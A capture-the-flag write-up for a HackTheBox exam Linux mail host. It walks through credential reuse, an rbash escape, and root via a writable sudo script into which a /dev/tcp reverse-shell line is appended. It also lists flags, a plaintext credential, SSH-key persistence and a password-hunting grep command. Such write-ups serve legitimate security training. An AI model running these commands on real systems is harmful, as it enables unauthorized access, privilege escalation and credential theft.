---
title: "NIX02"
category: "labs"
tags: []
excerpt: ""
date: "2026-04-30"
---

---
## Target Information

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Target Information:</span></summary>
<div class="callout-body">

```
IP Address: 10.129.17.46 (also appeared as 10.129.17.29, 10.129.17.39 across resets)
Hostname:   mail.luminex.htb (inferred — Dovecot mail server)
OS:         Linux (Ubuntu)
Platform:   HackTheBox CJCA Exam
```

</div>
</details>

---
## Timeline

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Timeline:</span></summary>
<div class="callout-body">

```
2026-04-25 — Enumerated ports; full mail stack found (FTP/POP3/IMAP)
2026-04-25 — Anonymous FTP/IMAP/XMLRPC access attempts failed
2026-04-25 — Stalled: could not progress without credentials; returned to NIX01
2026-04-25 — Located marc:010203 in /root/.docker/init.sql on NIX01 (post-root)
2026-04-25 — SSH as marc succeeded; landed in rbash
2026-04-25 — Escaped rbash via SSH command injection
2026-04-25 — sudo -l found .email-backup.sh NOPASSWD
2026-04-25 — Injected reverse shell; sudo execution yielded root
```

</div>
</details>

---
## Enumeration

### Port Scan Results

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Port Scan Results:</span></summary>
<div class="callout-body">

```
nmap -sT -sV -sC -p21,22,80,110,143,993,995 -Pn <target-ip>

PORT    STATE SERVICE    VERSION
21/tcp  open  ftp
22/tcp  open  ssh        OpenSSH
80/tcp  open  http
110/tcp open  pop3       Dovecot POP3
143/tcp open  imap       Dovecot IMAP
993/tcp open  imaps      Dovecot IMAPS (SSL)
995/tcp open  pop3s      Dovecot POP3S (SSL)
```

</div>
</details>

### Service Enumeration

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Service Enumeration:</span></summary>
<div class="callout-body">

```
# Test anonymous FTP
ftp <target-ip>

# Test anonymous IMAP via curl
curl -k 'imaps://<target-ip>' --user anonymous:anonymous -v

# Test IMAP manually
nc <target-ip> 143

# All unauthenticated access denied — valid credentials required
```

</div>
</details>

---
## Foothold

### Vulnerability Identified

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Vulnerability Identified:</span></summary>
<div class="callout-body">

```
Credential reuse — marc:010203 recovered from /root/.docker/init.sql on NIX01.
SSH accepts this credential. The marc account is configured with rbash (restricted
bash), limiting command execution — but rbash is bypassable via SSH command injection.
```

</div>
</details>

### Exploitation Steps

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Exploitation Steps:</span></summary>
<div class="callout-body">

```
# 1. SSH as marc — lands in rbash (restricted shell)
ssh marc@<target-ip>

# 2. Escape rbash by specifying unrestricted shell via SSH
ssh marc@<target-ip> "bash --noprofile"
# Result: unrestricted bash session as marc
```

</div>
</details>

---
## Privilege Escalation

### Vector Identified

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Vector Identified:</span></summary>
<div class="callout-body">

```
Sudo misconfiguration — marc can execute /home/marc/.email-backup.sh as root with
NOPASSWD. The script is owned and writable by marc, allowing arbitrary command
injection before running it with sudo.

sudo -l output:
(ALL) NOPASSWD: /home/marc/.email-backup.sh
```

</div>
</details>

### Steps Taken

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Steps Taken:</span></summary>
<div class="callout-body">

```
# 1. Check sudo permissions
sudo -l

# 2. Inspect the script
cat /home/marc/.email-backup.sh

# 3. Append reverse shell payload to the script
echo 'bash -i >& /dev/tcp/<attacker-ip>/<port> 0>&1' >> /home/marc/.email-backup.sh

# 4. Start listener on attacker machine
nc -lvnp <port>

# 5. Execute as root via sudo
sudo /home/marc/.email-backup.sh
# Result: root reverse shell
```

</div>
</details>

---
## Flags

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Flags:</span></summary>
<div class="callout-body">

```
User (marc): 823e1b360517fe100b59742e51426715
Root:        030fd50d8090ae366b30c51c2de7d18e
```

</div>
</details>

---
## Loot

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Loot:</span></summary>
<div class="callout-body">

```
backup:gmb_ADN6wje9tra3qwf — found in /root/log_backup.sh (valid on WIN02)
SSH key injected into /root/.ssh/authorized_keys — persistent root SSH access
```

</div>
</details>

---
## Rabbit Holes

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Rabbit Holes:</span></summary>
<div class="callout-body">

```
- Anonymous FTP and IMAP access — spent time testing all mail services
unauthenticated before realising credentials had not been found on NIX01 yet.
Wasted significant time here because NIX01 enumeration was incomplete.

- Did not enumerate all files on NIX02 after rooting before pivoting to WIN01/WIN02.
The backup credentials (backup:gmb_ADN6wje9tra3qwf) in /root/log_backup.sh
were required for WIN02. Had to backtrack after stalling on WIN02.
Lesson: check /root/ thoroughly before leaving every rooted host.
```

</div>
</details>

---
## Lessons Learned

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Lessons Learned:</span></summary>
<div class="callout-body">

```
- When a next host appears to need credentials, stop and enumerate the current host
exhaustively before moving on:
find /root /home -type f 2>/dev/null | xargs grep -l "password\|pass\|cred" 2>/dev/null
cat /root/*.sh /root/**/*.sh 2>/dev/null
- rbash is trivially bypassed — always try: ssh user@host "bash --noprofile"
- Check /root/ for scripts and loot after every privilege escalation. Backup scripts
and cron wrappers frequently contain credentials for lateral movement.
```

</div>
</details>

---
## Related Concepts
- [Linux Fundamentals](/knowledge/Operating-Systems/Linux/Linux-Fundamentals)
- [Protocols](/knowledge/Networking/Protocols)
- [Linux Shells](/knowledge/Operating-Systems/Linux/Linux-Shells)

## Related Techniques
- (rbash Escape Technique — not yet created, see backlog)

## Related Playbooks
- [Linux Pentest Playbook](/playbooks/Linux-Pentest-Playbook)

## Related Tools
- [PEASS-ng](/tools/Post-Exploitation/PEASS-ng)
- [Nmap](/tools/Enumeration/Nmap)
- [curl](/tools/Utilities/curl)

---
## References / Images
- marc .ssh Directory
- PrivEsc via email-backup.sh Injection
- Root Flag
- backup Credentials in log_backup.sh
- NIX02 Overview
- rbash Escape and User Flag
- User Flag (alt)
